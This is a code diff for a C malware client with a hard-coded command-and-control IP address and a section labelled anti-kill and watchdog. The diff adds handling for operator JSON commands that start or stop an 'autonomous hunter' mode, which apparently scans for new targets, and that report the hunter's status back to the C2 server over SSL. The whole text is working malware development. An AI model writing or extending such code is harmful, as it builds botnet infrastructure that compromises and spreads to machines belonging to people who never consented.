@@ -19,6 +19,7 @@
 #include <openssl/err.h>
 #include <json-c/json.h>
 #include "config.h"
+#include "autonomous_hunter.h"
 
 #ifndef C2_HOST
 #define C2_HOST "93.95.231.134"
@@ -35,6 +36,7 @@ int is_connected = 0;
 pid_t watchdog_pid = 0;
 char my_path[256];
 char my_random_name[64];
+int hunter_mode = 0;
 
 // ============================================================================
 // ANTI-KILL & WATCHDOG
@@ -337,11 +339,49 @@ int connect_to_c2() {
             if (n <= 0) {
                 printf("[-] Lost connection to C2\n");
                 is_connected = 0;
+                hunter_mode = 0;
                 break;
             }
             
             buffer[n] = '\0';
             printf("[C2] %s\n", buffer);
+            
+            // Procesar comandos JSON
+            json_object *cmd = json_tokener_parse(buffer);
+            if (cmd) {
+                json_object *action_obj = NULL;
+                if (json_object_object_get_ex(cmd, "action", &action_obj)) {
+                    const char *action = json_object_get_string(action_obj);
+                    
+                    if (strcmp(action, "hunter") == 0) {
+                        json_object *state_obj = NULL;
+                        if (json_object_object_get_ex(cmd, "state", &state_obj)) {
+                            const char *state = json_object_get_string(state_obj);
+                            
+                            if (strcmp(state, "on") == 0 && hunter_mode == 0) {
+                                hunter_mode = 1;
+                                printf("[*] Starting Hunter Mode...\n");
+                                start_autonomous_hunter();
+                                
+                                const char *response = "{\"status\":\"hunter_started\"}\n";
+                                SSL_write(c2_ssl, response, strlen(response));
+                            } else if (strcmp(state, "off") == 0) {
+                                hunter_mode = 0;
+                                const char *response = "{\"status\":\"hunter_stopped\"}\n";
+                                SSL_write(c2_ssl, response, strlen(response));
+                            }
+                        }
+                    } else if (strcmp(action, "get_hunter_stats") == 0) {
+                        // Enviar estadísticas del hunter
+                        char stats[512];
+                        snprintf(stats, sizeof(stats),
+                            "{\"hunter_active\":%d,\"uptime\":%d,\"scanned\":0}\n",
+                            hunter_mode, (int)time(NULL));
+                        SSL_write(c2_ssl, stats, strlen(stats));
+                    }
+                }
+                json_object_put(cmd);
+            }
             
             // Responder con heartbeat
             const char *pong = "{\"status\":\"alive\"}\n";
